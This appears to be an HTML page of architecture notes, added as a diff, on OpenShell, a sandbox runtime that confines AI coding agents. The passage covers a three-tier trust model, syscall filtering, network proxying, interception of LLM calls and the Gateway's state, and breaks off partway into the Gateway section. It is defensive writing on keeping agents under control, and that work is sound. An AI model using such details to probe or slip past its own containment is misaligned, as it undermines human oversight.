@@ -1,0 +1,1274 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<meta name="color-scheme" content="light dark" />
+<link rel="icon" href="data:," />
+<title>OpenShell Architecture Deep Dive</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&family=Noto+Sans+TC:wght@400;500;700&display=swap" rel="stylesheet" />
+<style>
+:root{
+  --bg:#f7f8f5; --bg2:#eef0ea; --panel:#ffffff; --panel2:#f2f4ee;
+  --ink:#161a14; --ink2:#3d463a; --muted:#6b7568;
+  --line:#d8dcd2; --line2:#c3c9bc;
+  --accent:#4d7c0f; --accent-strong:#3f6212; --accent-soft:#e7f0d8;
+  --amber:#b45309; --amber-soft:#fdf0e0;
+  --red:#b91c1c; --red-soft:#fbe7e7;
+  --blue:#1d4ed8; --blue-soft:#e3ebfd;
+  --teal:#0f766e; --teal-soft:#dcf2ef;
+  --code-bg:#141a12; --code-ink:#d7e4c8;
+  --shadow:0 1px 2px rgba(22,26,20,.06),0 8px 24px -12px rgba(22,26,20,.18);
+  --radius:10px;
+}
+@media (prefers-color-scheme: dark){
+  :root{
+    --bg:#10130e; --bg2:#151a12; --panel:#181d15; --panel2:#1d231a;
+    --ink:#e8ecdf; --ink2:#c3cbb8; --muted:#8f9a87;
+    --line:#2c332a; --line2:#3a4237;
+    --accent:#a3d94e; --accent-strong:#bef264; --accent-soft:#26331a;
+    --amber:#f0b35e; --amber-soft:#3a2c16;
+    --red:#f08a8a; --red-soft:#3b1e1e;
+    --blue:#93b4f5; --blue-soft:#1d2a4a;
+    --teal:#5fd3c6; --teal-soft:#14332e;
+    --code-bg:#0b0e09; --code-ink:#cfe3b4;
+    --shadow:0 1px 2px rgba(0,0,0,.4),0 10px 28px -14px rgba(0,0,0,.6);
+  }
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+@media (prefers-reduced-motion: reduce){ html{scroll-behavior:auto} *{transition:none!important;animation:none!important} }
+body{margin:0;background:var(--bg);color:var(--ink);font-family:"IBM Plex Sans","Noto Sans TC",system-ui,sans-serif;font-size:16px;line-height:1.65;-webkit-font-smoothing:antialiased}
+.mono{font-family:"IBM Plex Mono",ui-monospace,monospace}
+a{color:var(--accent-strong)}
+code{font-family:"IBM Plex Mono",ui-monospace,monospace;font-size:.86em;background:var(--panel2);border:1px solid var(--line);border-radius:5px;padding:.05em .35em;word-break:break-word}
+h1,h2,h3,h4{line-height:1.25;margin:0}
+p{margin:0 0 .9em}
+ul,ol{margin:.2em 0 1em;padding-left:1.3em}
+li{margin:.3em 0}
+.wrap{max-width:1240px;margin:0 auto;padding:0 20px}
+
+/* top bar */
+.topbar{position:sticky;top:0;z-index:60;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-in{display:flex;align-items:center;gap:14px;padding:10px 0;flex-wrap:wrap}
+.brand{font-family:"IBM Plex Mono",monospace;font-weight:600;font-size:.95rem;letter-spacing:.02em}
+.brand b{color:var(--accent-strong)}
+.topbar .spacer{flex:1}
+.searchbox{display:flex;align-items:center;gap:8px;background:var(--panel);border:1px solid var(--line2);border-radius:999px;padding:5px 12px;min-width:210px}
+.searchbox input{border:0;background:transparent;color:var(--ink);font:inherit;font-size:.9rem;outline:none;width:100%}
+.langtoggle{display:flex;border:1px solid var(--line2);border-radius:999px;overflow:hidden;background:var(--panel)}
+.langtoggle button{border:0;background:transparent;color:var(--muted);font:inherit;font-size:.85rem;font-weight:600;padding:6px 14px;cursor:pointer}
+.langtoggle button[aria-pressed="true"]{background:var(--accent);color:#fff}
+@media (prefers-color-scheme: dark){ .langtoggle button[aria-pressed="true"]{color:#141a12} }
+
+/* hero */
+.hero{padding:42px 0 8px}
+.hero .kicker{font-family:"IBM Plex Mono",monospace;font-size:.78rem;letter-spacing:.14em;text-transform:uppercase;color:var(--accent-strong);margin-bottom:12px}
+.hero h1{font-size:clamp(1.9rem,4.6vw,3.1rem);font-weight:700;letter-spacing:-.01em;max-width:20ch}
+.hero .lede{font-size:1.08rem;color:var(--ink2);max-width:72ch;margin-top:14px}
+.thesis{margin-top:22px;background:var(--code-bg);color:var(--code-ink);border-radius:var(--radius);padding:20px 22px;font-family:"IBM Plex Mono",monospace;font-size:.95rem;line-height:1.7}
+.thesis .hl{color:#a3d94e;font-weight:600}
+.thesis .dim{opacity:.75}
+.legend{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px;align-items:center}
+.legend .lab{font-size:.8rem;color:var(--muted);font-weight:600;margin-right:2px}
+.tag{display:inline-flex;align-items:center;gap:5px;font-family:"IBM Plex Mono",monospace;font-size:.68rem;font-weight:600;letter-spacing:.03em;border-radius:999px;padding:2px 9px;border:1px solid;white-space:nowrap;vertical-align:middle}
+.tag::before{content:"";width:6px;height:6px;border-radius:50%;background:currentColor}
+.tag.d0003{color:var(--accent-strong);border-color:var(--accent);background:var(--accent-soft)}
+.tag.official{color:var(--blue);border-color:var(--blue);background:var(--blue-soft)}
+.tag.docs{color:var(--teal);border-color:var(--teal);background:var(--teal-soft)}
+.tag.vendor{color:var(--amber);border-color:var(--amber);background:var(--amber-soft)}
+.tag.unconf{color:var(--red);border-color:var(--red);background:var(--red-soft)}
+.tag.user{color:var(--muted);border-color:var(--line2);background:var(--panel2)}
+
+/* layout */
+.layout{display:grid;grid-template-columns:230px 1fr;gap:36px;padding:26px 0 70px;align-items:start}
+nav.toc{position:sticky;top:64px;font-size:.86rem}
+nav.toc .toc-h{font-family:"IBM Plex Mono",monospace;font-size:.7rem;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
+nav.toc a{display:block;color:var(--ink2);text-decoration:none;padding:5px 10px;border-radius:7px;border-left:2px solid transparent}
+nav.toc a:hover{background:var(--panel2)}
+nav.toc a.active{background:var(--accent-soft);color:var(--accent-strong);border-left-color:var(--accent);font-weight:600}
+main{min-width:0}
+section.chapter{padding:30px 0 8px;border-top:1px solid var(--line);scroll-margin-top:70px}
+section.chapter:first-child{border-top:0;padding-top:6px}
+.ch-head{display:flex;align-items:baseline;gap:12px;margin-bottom:6px;flex-wrap:wrap}
+.ch-num{font-family:"IBM Plex Mono",monospace;font-size:.8rem;color:var(--accent-strong);font-weight:600;border:1px solid var(--accent);border-radius:6px;padding:1px 8px;background:var(--accent-soft)}
+.ch-head h2{font-size:1.55rem;font-weight:700}
+.ch-sub{color:var(--muted);max-width:75ch;margin-bottom:16px}
+h3.sub{font-size:1.12rem;font-weight:600;margin:22px 0 8px}
+h4.sub{font-size:.98rem;font-weight:600;margin:16px 0 6px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:18px 20px;box-shadow:var(--shadow);margin:14px 0}
+.note{border-radius:var(--radius);padding:14px 16px;margin:14px 0;font-size:.93rem;border:1px solid}
+.note.warn{background:var(--amber-soft);border-color:var(--amber)}
+.note.bad{background:var(--red-soft);border-color:var(--red)}
+.note.good{background:var(--accent-soft);border-color:var(--accent)}
+.note .note-t{font-weight:700;margin-bottom:4px}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+@media (max-width:900px){ .grid2,.grid3{grid-template-columns:1fr} .layout{grid-template-columns:1fr} nav.toc{position:static;display:flex;flex-wrap:wrap;gap:4px} nav.toc .toc-h{width:100%} nav.toc a{border:1px solid var(--line);border-left:1px solid var(--line)} }
+
+/* tables */
+.tblwrap{overflow-x:auto;margin:12px 0 18px;border:1px solid var(--line);border-radius:var(--radius);background:var(--panel)}
+table{border-collapse:collapse;width:100%;font-size:.9rem}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:"IBM Plex Mono",monospace;font-size:.72rem;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);background:var(--panel2);white-space:nowrap}
+tr:last-child td{border-bottom:0}
+td.c,td code{white-space:nowrap}
+#s11 table td.c{white-space:normal}
+tr.hl-row td{background:var(--accent-soft)}
+tr.dim-row{opacity:.45}
+
+/* code */
+pre{background:var(--code-bg);color:var(--code-ink);border-radius:var(--radius);padding:16px 18px;overflow-x:auto;font-family:"IBM Plex Mono",monospace;font-size:.82rem;line-height:1.6;margin:12px 0}
+pre .cm{opacity:.6}
+pre .kw{color:#a3d94e}
+
+/* three-tier diagram */
+.tiers{display:grid;gap:10px;margin:16px 0}
+.tier{border:1.5px solid var(--line2);border-radius:var(--radius);padding:16px 18px;background:var(--panel);cursor:pointer;text-align:left;font:inherit;color:inherit;width:100%;transition:border-color .15s,background .15s}
+.tier:hover{border-color:var(--accent)}
+.tier.sel{border-color:var(--accent);background:var(--accent-soft)}
+.tier .t-top{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.tier .t-name{font-weight:700;font-size:1.05rem}
+.tier .t-role{color:var(--muted);font-size:.88rem}
+.trust{margin-left:auto;font-family:"IBM Plex Mono",monospace;font-size:.72rem;font-weight:600;border-radius:999px;padding:3px 10px;border:1px solid}
+.trust.t1{color:var(--accent-strong);border-color:var(--accent);background:var(--accent-soft)}
+.trust.t2{color:var(--amber);border-color:var(--amber);background:var(--amber-soft)}
+.trust.t3{color:var(--red);border-color:var(--red);background:var(--red-soft)}
+.tier .t-chips{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
+.chip{font-family:"IBM Plex Mono",monospace;font-size:.72rem;background:var(--panel2);border:1px solid var(--line);border-radius:6px;padding:2px 8px}
+.flow-arrow{text-align:center;color:var(--muted);font-family:"IBM Plex Mono",monospace;font-size:.75rem}
+.tier-detail{background:var(--panel);border:1px solid var(--accent);border-radius:var(--radius);padding:16px 18px;margin-top:4px}
+.tier-detail h4{margin:0 0 6px;font-size:1rem}
+
+/* tabs */
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:14px 0 0}
+.tabs button{font:inherit;font-size:.88rem;font-weight:600;border:1px solid var(--line2);background:var(--panel);color:var(--ink2);border-radius:999px;padding:7px 15px;cursor:pointer}
+.tabs button[aria-selected="true"]{background:var(--accent);border-color:var(--accent);color:#fff}
+@media (prefers-color-scheme: dark){ .tabs button[aria-selected="true"]{color:#141a12} }
+.tabpanel{border:1px solid var(--line);border-radius:var(--radius);background:var(--panel);padding:18px 20px;margin-top:12px;box-shadow:var(--shadow)}
+.badge-static,.badge-dyn{font-family:"IBM Plex Mono",monospace;font-size:.68rem;font-weight:600;border-radius:999px;padding:2px 9px;border:1px solid}
+.badge-static{color:var(--red);border-color:var(--red);background:var(--red-soft)}
+.badge-dyn{color:var(--teal);border-color:var(--teal);background:var(--teal-soft)}
+
+/* sequence walkthrough */
+.seq-ctrl{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin:12px 0}
+.seq-ctrl button{font:inherit;font-size:.86rem;font-weight:600;border:1px solid var(--line2);background:var(--panel);color:var(--ink);border-radius:8px;padding:7px 14px;cursor:pointer}
+.seq-ctrl button.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+@media (prefers-color-scheme: dark){ .seq-ctrl button.primary{color:#141a12} }
+.seq-ctrl button:disabled{opacity:.4;cursor:default}
+.seq-progress{font-family:"IBM Plex Mono",monospace;font-size:.8rem;color:var(--muted)}
+.seq-stage{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:18px;box-shadow:var(--shadow)}
+.seq-actors{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px}
+.seq-actor{font-family:"IBM Plex Mono",monospace;font-size:.72rem;border:1px solid var(--line2);border-radius:6px;padding:3px 9px;color:var(--muted);transition:all .15s}
+.seq-actor.on{border-color:var(--accent);color:var(--accent-strong);background:var(--accent-soft);font-weight:600}
+.seq-step{min-height:86px}
+.seq-step .ss-fromto{font-family:"IBM Plex Mono",monospace;font-size:.8rem;color:var(--accent-strong);font-weight:600;margin-bottom:4px}
+.seq-step .ss-text{font-size:1rem}
+.seq-dots{display:flex;gap:5px;margin-top:14px;flex-wrap:wrap}
+.seq-dots button{width:26px;height:6px;border-radius:3px;border:0;background:var(--line2);cursor:pointer;padding:0}
+.seq-dots button.on{background:var(--accent)}
+.seq-dots button.done{background:var(--accent);opacity:.45}
+
+/* details */
+details{border:1px solid var(--line);border-radius:var(--radius);background:var(--panel);margin:10px 0;padding:0 16px}
+details summary{cursor:pointer;font-weight:600;padding:13px 0;list-style:none}
+details summary::-webkit-details-marker{display:none}
+details summary::before{content:"▸ ";color:var(--accent-strong)}
+details[open ] summary::before{content:"▾ "}
+details .det-body{padding-bottom:14px}
+
+/* principles */
+.principles{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px;margin:14px 0}
+.principle{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:16px 18px;box-shadow:var(--shadow)}
+.principle .p-num{font-family:"IBM Plex Mono",monospace;color:var(--accent-strong);font-weight:600;font-size:.8rem}
+.principle h4{margin:4px 0 6px;font-size:1rem}
+.principle p{font-size:.9rem;color:var(--ink2);margin:0}
+
+/* aidr layers */
+.aidr{display:grid;gap:8px;margin:14px 0}
+.aidr .layer{border:1px solid var(--line2);border-radius:8px;padding:11px 16px;background:var(--panel);display:flex;gap:12px;align-items:baseline;flex-wrap:wrap}
+.aidr .layer.l0{border-color:var(--accent);background:var(--accent-soft);border-width:1.5px}
+.aidr .layer .lv{font-family:"IBM Plex Mono",monospace;font-weight:600;font-size:.8rem;min-width:74px}
+.aidr .layer .ld{color:var(--ink2);font-size:.9rem}
+
+footer{border-top:1px solid var(--line);padding:28px 0 50px;color:var(--muted);font-size:.86rem}
+footer a{color:var(--accent-strong)}
+.src-list{columns:2;column-gap:30px}
+@media (max-width:700px){ .src-list{columns:1} }
+.noresult{display:none;padding:14px;border:1px dashed var(--line2);border-radius:var(--radius);color:var(--muted);font-size:.9rem;margin:10px 0}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="wrap topbar-in">
+    <div class="brand">OpenShell <b>//</b> <span data-en="Architecture Deep Dive" data-zh="架構深掘">Architecture Deep Dive</span></div>
+    <div class="spacer"></div>
+    <label class="searchbox">
+      <span aria-hidden="true">⌕</span>
+      <input id="searchInput" type="search" data-en-ph="Search crates, RPCs, fields…" data-zh-ph="搜尋 crate、RPC、欄位…" placeholder="Search crates, RPCs, fields…" />
+    </label>
+    <div class="langtoggle" role="group" aria-label="Language">
+      <button id="langEn" aria-pressed="true">EN</button>
+      <button id="langZh" aria-pressed="false">繁中</button>
+    </div>
+  </div>
+</div>
+
+<div class="wrap">
+  <header class="hero">
+    <div class="kicker">NVIDIA OpenShell · D0003 <span data-en="architecture notes" data-zh="架構筆記">architecture notes</span> · <span data-en="checked against NVIDIA sources, 2026-10-29" data-zh="已對照 NVIDIA 來源查證，2026-10-29">checked against NVIDIA sources, 2026-10-29</span></div>
+    <h1 data-en="Kernel-level enforcement for AI agents" data-zh="為 AI agent 而設的核心層強制執行">Kernel-level enforcement for AI agents</h1>
+    <p class="lede" data-en="OpenShell is a sandbox runtime platform that gives AI coding agents kernel-backed isolation. A Gateway (control plane) manages lifecycle, credentials and policy from outside the sandbox; a Supervisor (data plane) runs inside it and enforces four policy domains — filesystem, process, network and inference routing. The agent is not asked to behave: the kernel denies the syscall." data-zh="OpenShell 是一個 sandbox runtime 平台，為 AI coding agent 提供核心層支撐的隔離。Gateway（control plane）在 sandbox 外管理生命週期、憑證與政策；Supervisor（data plane）在 sandbox 內執行四個政策域——filesystem、process、network 與 inference routing。重點不是要求 agent 自律，而是核心直接拒絕 syscall。">OpenShell is a sandbox runtime platform that gives AI coding agents kernel-backed isolation. A Gateway (control plane) manages lifecycle, credentials and policy from outside the sandbox; a Supervisor (data plane) runs inside it and enforces four policy domains — filesystem, process, network and inference routing. The agent is not asked to behave: the kernel denies the syscall.</p>
+    <div class="thesis">
+      <span class="dim">//</span> <span data-en="The thesis — Layer 0 of the AIDR architecture:" data-zh="核心命題——AIDR 架構的 Layer 0：">The thesis — Layer 0 of the AIDR architecture:</span><br/>
+      <span data-en="Other layers govern what an agent" data-zh="其他層治理的是 agent">Other layers govern what an agent</span> <span class="hl" data-en="SHOULD" data-zh="應該">SHOULD</span> <span data-en="do. OpenShell makes" data-zh="做的事。OpenShell 讓">do. OpenShell makes</span> <span class="hl" data-en="“you CAN'T”" data-zh="「你不能」">“you CAN'T”</span> <span data-en="real at the OS level — mathematically verified before deployment, enforced by the kernel at runtime." data-zh="在 OS 層成為事實——部署前經數學驗證，執行時由核心強制。">real at the OS level — mathematically verified before deployment, enforced by the kernel at runtime.</span>
+    </div>
+    <div class="legend">
+      <span class="lab" data-en="Evidence tags:" data-zh="證據標籤：">Evidence tags:</span>
+      <span class="tag d0003">D0003 <span data-en="notes" data-zh="筆記">notes</span></span>
+      <span class="tag official">NVIDIA <span data-en="official" data-zh="官方">official</span></span>
+      <span class="tag docs" data-en="Docs verified" data-zh="文件實查">Docs verified</span>
+      <span class="tag vendor" data-en="Vendor-reported" data-zh="廠商主張">Vendor-reported</span>
+      <span class="tag unconf" data-en="Unconfirmed" data-zh="未確認">Unconfirmed</span>
+      <span class="tag user" data-en="User framing (AIDR)" data-zh="使用者框架（AIDR）">User framing (AIDR)</span>
+    </div>
+  </header>
+
+  <div class="layout">
+    <nav class="toc" id="toc">
+      <div class="toc-h" data-en="Contents" data-zh="目錄">Contents</div>
+      <a href="#s1" data-en="1 · Three-tier model" data-zh="1 · 三層信任模型">1 · Three-tier model</a>
+      <a href="#s2" data-en="2 · Gateway" data-zh="2 · Gateway">2 · Gateway</a>
+      <a href="#s3" data-en="3 · Supervisor" data-zh="3 · Supervisor">3 · Supervisor</a>
+      <a href="#s4" data-en="4 · Workspace: 19 crates" data-zh="4 · Workspace：19 個 crate">4 · Workspace: 19 crates</a>
+      <a href="#s5" data-en="5 · Four policy domains" data-zh="5 · 四個政策域">5 · Four policy domains</a>
+      <a href="#s6" data-en="6 · Policy lifecycle" data-zh="6 · 政策生命週期">6 · Policy lifecycle</a>
+      <a href="#s7" data-en="7 · Z3 prover" data-zh="7 · Z3 prover">7 · Z3 prover</a>
+      <a href="#s8" data-en="8 · Compute drivers" data-zh="8 · Compute drivers">8 · Compute drivers</a>
+      <a href="#s9" data-en="9 · Auth &amp; identity" data-zh="9 · 認證與身分">9 · Auth &amp; identity</a>
+      <a href="#s10" data-en="10 · OCSF logging" data-zh="10 · OCSF 日誌">10 · OCSF logging</a>
+      <a href="#s11" data-en="11 · gRPC API surface" data-zh="11 · gRPC API 介面">11 · gRPC API surface</a>
+      <a href="#s12" data-en="12 · Sequence walkthroughs" data-zh="12 · 時序圖走讀">12 · Sequence walkthroughs</a>
+      <a href="#s13" data-en="13 · Security analysis" data-zh="13 · 安全分析">13 · Security analysis</a>
+      <a href="#s14" data-en="14 · Design principles" data-zh="14 · 設計原則">14 · Design principles</a>
+      <a href="#s15" data-en="15 · AIDR Layer 0" data-zh="15 · AIDR Layer 0">15 · AIDR Layer 0</a>
+      <a href="#s16" data-en="16 · Limitations &amp; open questions" data-zh="16 · 限制與開放問題">16 · Limitations &amp; open questions</a>
+    </nav>
+
+    <main id="main">
+
+    <!-- ============ 1 · THREE-TIER ============ -->
+    <section class="chapter" id="s1">
+      <div class="ch-head"><span class="ch-num">01</span><h2 data-en="The three-tier trust model" data-zh="三層信任模型">The three-tier trust model</h2><span class="tag d0003">D0003</span></div>
+      <p class="ch-sub" data-en="Tap a tier to inspect what lives there, what it can do, and what it must never hold. The Supervisor initiates an outbound-only bidirectional gRPC stream to the Gateway (ConnectSupervisor) — the Gateway never connects inward, so sandboxes work behind NAT and firewalls, and a compromised sandbox cannot pivot into the control plane." data-zh="點選任一層，查看該層放什麼、能做什麼、絕不能持有什麼。Supervisor 以 outbound-only 的雙向 gRPC stream 連向 Gateway（ConnectSupervisor）——Gateway 永不向內連線，因此 sandbox 可部署在 NAT 與防火牆之後，被攻陷的 sandbox 也無法以 Gateway 為跳板。">Tap a tier to inspect what lives there, what it can do, and what it must never hold. The Supervisor initiates an outbound-only bidirectional gRPC stream to the Gateway (<code>ConnectSupervisor</code>) — the Gateway never connects inward, so sandboxes work behind NAT and firewalls, and a compromised sandbox cannot pivot into the control plane.</p>
+
+      <div class="tiers" role="group" aria-label="Trust tiers">
+        <button class="tier sel" data-tier="gateway" aria-pressed="true">
+          <span class="t-top"><span class="t-name">Gateway</span><span class="t-role" data-en="control plane · openshell-server · outside the sandbox" data-zh="control plane · openshell-server · 位於 sandbox 之外">control plane · openshell-server · outside the sandbox</span><span class="trust t1" data-en="TRUSTED" data-zh="完全受信任">TRUSTED</span></span>
+          <span class="t-chips"><span class="chip">Sandbox Lifecycle</span><span class="chip">Provider Registry</span><span class="chip">Policy Store</span><span class="chip">Auth (OIDC / K8s / JWT)</span><span class="chip">Compute Drivers</span><span class="chip">Policy Prover</span></span>
+        </button>
+        <div class="flow-arrow">▼ <span data-en="creates container / VM · outbound gRPC only · never connects inward" data-zh="建立 container / VM · 僅 outbound gRPC · 永不向內連線">creates container / VM · outbound gRPC only · never connects inward</span> ▼</div>
+        <button class="tier" data-tier="supervisor" aria-pressed="false">
+          <span class="t-top"><span class="t-name">Supervisor</span><span class="t-role" data-en="data plane · openshell-sandbox · inside the sandbox as PID 1 / init" data-zh="data plane · openshell-sandbox · 在 sandbox 內以 PID 1 / init 執行">data plane · openshell-sandbox · inside the sandbox as PID 1 / init</span><span class="trust t2" data-en="SEMI-TRUSTED" data-zh="半受信任">SEMI-TRUSTED</span></span>
+          <span class="t-chips"><span class="chip">Landlock LSM</span><span class="chip">seccomp BPF</span><span class="chip">cap_drop</span><span class="chip">netns + nftables</span><span class="chip">OPA L7 proxy</span><span class="chip">inference.local router</span><span class="chip">OCSF Logger</span><span class="chip">SSH Server</span></span>
+        </button>
+        <div class="flow-arrow">▼ <span data-en="spawns as child · uid=sandbox, gid=sandbox · never root" data-zh="以 child 程序啟動 · uid=sandbox、gid=sandbox · 永不以 root 執行">spawns as child · uid=sandbox, gid=sandbox · never root</span> ▼</div>
+        <button class="tier" data-tier="agent" aria-pressed="false">
+          <span class="t-top"><span class="t-name" data-en="Agent process" data-zh="Agent 程序">Agent process</span><span class="t-role" data-en="e.g. Claude Code, Codex — fully constrained by the layers above" data-zh="例如 Claude Code、Codex——完全受上層約束">e.g. Claude Code, Codex — fully constrained by the layers above</span><span class="trust t3" data-en="UNTRUSTED" data-zh="不受信任">UNTRUSTED</span></span>
+          <span class="t-chips"><span class="chip" data-en="syscalls filtered (Landlock + seccomp)" data-zh="syscall 受過濾（Landlock + seccomp）">syscalls filtered (Landlock + seccomp)</span><span class="chip" data-en="all traffic via netns → OPA proxy" data-zh="所有流量經 netns → OPA proxy">all traffic via netns → OPA proxy</span><span class="chip" data-en="LLM calls intercepted at inference.local" data-zh="LLM 呼叫在 inference.local 被攔截">LLM calls intercepted at inference.local</span></span>
+        </button>
+      </div>
+      <div class="tier-detail" id="tierDetail"></div>
+
+      <div class="note warn">
+        <div class="note-t" data-en="Reconciliation — “trusted Supervisor” vs “semi-trusted Supervisor”" data-zh="對照釐清——「受信任的 Supervisor」vs「半受信任的 Supervisor」">Reconciliation — “trusted Supervisor” vs “semi-trusted Supervisor”</div>
+        <p style="margin:0" data-en="NVIDIA's blog and docs describe the Supervisor as the trusted side, paired with each sandbox and running outside the agent workload. D0003 refines this into three tiers: the Supervisor runs inside the sandbox boundary as PID 1, so it is semi-trusted — privileged relative to the agent, but not equivalent to the Gateway outside. This page uses the D0003 three-tier model and flags the difference rather than merging the two framings." data-zh="NVIDIA 部落格與文件把 Supervisor 描述為受信任側：與每個 sandbox 配對、跑在 agent workload 之外。D0003 將此細化為三層：Supervisor 實際位於 sandbox 邊界內、以 PID 1 執行，因此是半受信任——相對於 agent 有特權，但不等同於邊界外的 Gateway。本頁採用 D0003 的三層模型，並明確標示差異，不把兩種說法默默合併。">NVIDIA's blog and docs describe the Supervisor as the trusted side, paired with each sandbox and running outside the agent workload. D0003 refines this into three tiers: the Supervisor runs <em>inside</em> the sandbox boundary as PID 1, so it is <strong>semi-trusted</strong> — privileged relative to the agent, but not equivalent to the Gateway outside. This page uses the D0003 three-tier model and flags the difference rather than merging the two framings.</p>
+      </div>
+
+      <div class="note good">
+        <div class="note-t" data-en="What is confirmed at platform level" data-zh="平台層級已確認的事項">What is confirmed at platform level <span class="tag official">NVIDIA official</span> <span class="tag docs" data-en="Docs verified" data-zh="文件實查">Docs verified</span></div>
+        <p style="margin:0" data-en="OpenShell is open source under Apache 2.0. The 2026-09-28 launch materials cite version 0.1.0; docs checked on 2026-10-29 already read v0.1.6 — cite versions with a check date. The official platform FAQ lists Claude Code, Codex, OpenCode, GitHub Copilot CLI and OpenClaw as supported agents; Cursor appears in the 2026-09-28 press release in the SpaceXAI context, not in the FAQ support list, and is not presented here as out-of-the-box support." data-zh="OpenShell 為 Apache 2.0 開源。2026-09-28 發表材料標示版本 0.1.0；2026-10-29 實查文件已是 v0.1.6——引用版本時應附查核日期。官方平台 FAQ 列出的支援 agent 為 Claude Code、Codex、OpenCode、GitHub Copilot CLI 與 OpenClaw；Cursor 出現在 2026-09-28 新聞稿的 SpaceXAI 段落，並非 FAQ 支援清單，本頁不將其表述為開箱即用的支援。">OpenShell is open source under Apache 2.0. The 2026-09-28 launch materials cite version 0.1.0; docs checked on 2026-10-29 already read <strong>v0.1.6</strong> — cite versions with a check date. The official platform FAQ lists Claude Code, Codex, OpenCode, GitHub Copilot CLI and OpenClaw as supported agents; Cursor appears in the 2026-09-28 press release in the SpaceXAI context, not in the FAQ support list, and is not presented here as out-of-the-box support.</p>
+      </div>
+    </section>
+
+    <!-- ============ 2 · GATEWAY ============ -->
+    <section class="chapter" id="s2">
+      <div class="ch-head"><span class="ch-num">02</span><h2 data-en="Gateway deep dive" data-zh="Gateway 深掘">Gateway deep dive</h2><span class="tag d0003">D0003 · openshell-server</span></div>
+      <p class="ch-sub" data-en="The operator-facing control plane. It runs outside all sandboxes, owns the authoritative state, and is the only component that issues credentials. Per the verified architecture docs, the Gateway is likewise the only credential issuer in NVIDIA's own framing." data-zh="操作者面向的 control plane。它跑在所有 sandbox 之外，持有權威狀態，也是唯一簽發憑證的元件。經查證的架構文件同樣指出：Gateway 是 NVIDIA 自家說法中唯一的憑證簽發者。">The operator-facing control plane. It runs outside all sandboxes, owns the authoritative state, and is the only component that issues credentials. Per the verified architecture docs, the Gateway is likewise the only credential issuer in NVIDIA's own framing.</p>
+
+      <h3 class="sub">ServerState <span class="tag d0003">D0003</span></h3>
+      <div class="tblwrap"><table>
+        <thead><tr><th>Field</th><th>Type</th><th data-en="Role" data-zh="職責">Role</th></tr></thead>
+        <tbody>
+          <tr><td class="c"><code>config</code></td><td class="c">Config</td><td data-en="Gateway configuration" data-zh="Gateway 組態">Gateway configuration</td></tr>
+          <tr><td class="c"><code>store</code></td><td class="c">Arc&lt;Store&gt;</td><td data-en="SQLx persistence (Postgres / SQLite): sandboxes, policies, providers, settings" data-zh="SQLx 持久化（Postgres / SQLite）：sandboxes、policies、providers、settings">SQLx persistence (Postgres / SQLite): sandboxes, policies, providers, settings</td></tr>
+          <tr><td class="c"><code>compute</code></td><td class="c">ComputeRuntime</td><td data-en="Compute driver abstraction over Docker / Podman / K8s / MicroVM" data-zh="Compute driver 抽象層，涵蓋 Docker / Podman / K8s / MicroVM">Compute driver abstraction over Docker / Podman / K8s / MicroVM</td></tr>
+          <tr><td class="c"><code>sandbox_index</code></td><td class="c">SandboxIndex</td><td data-en="In-memory sandbox correlation" data-zh="記憶體內的 sandbox 對應索引">In-memory sandbox correlation</td></tr>
+          <tr><td class="c"><code>sandbox_watch_bus</code></td><td class="c">SandboxWatchBus</td><td data-en="Sandbox update notifications" data-zh="Sandbox 更新通知">Sandbox update notifications</td></tr>
+          <tr><td class="c"><code>tracing_log_bus</code></td><td class="c">TracingLogBus</td><td data-en="Server log bus" data-zh="Server 日誌匯流排">Server log bus</td></tr>
+          <tr><td class="c"><code>supervisor_sessions</code></td><td class="c">SupervisorSessionRegistry</td><td data-en="Active supervisor streams (one per sandbox)" data-zh="作用中的 supervisor stream（每個 sandbox 一條）">Active supervisor streams (one per sandbox)</td></tr>
+          <tr><td class="c"><code>oidc_cache</code></td><td class="c">Option&lt;JwksCache&gt;</td><td data-en="OIDC JWKS caching" data-zh="OIDC JWKS 快取">OIDC JWKS caching</td></tr>
+          <tr><td class="c"><code>sandbox_jwt_issuer</code></td><td class="c">SandboxJwtIssuer</td><td data-en="Mints sandbox JWTs bound to a single sandbox and run" data-zh="簽發綁定單一 sandbox 與單次 run 的 sandbox JWT">Mints sandbox JWTs bound to a single sandbox and run</td></tr>
+          <tr><td class="c"><code>sandbox_jwt_authenticator</code></td><td class="c">SandboxJwtAuth</td><td data-en="Validates sandbox JWTs on connect-back" data-zh="在 supervisor 回連時驗證 sandbox JWT">Validates sandbox JWTs on connect-back</td></tr>
+          <tr><td class="c"><code>k8s_sa_authenticator</code></td><td class="c">K8sSaAuth</td><td data-en="Kubernetes ServiceAccount bootstrap" data-zh="Kubernetes ServiceAccount bootstrap">Kubernetes ServiceAccount bootstrap</td></tr>
+        </tbody>
+      </table></div>
+
+      <h3 class="sub" data-en="Eight responsibilities" data-zh="八項職責">Eight responsibilities</h3>
+      <div class="grid2">
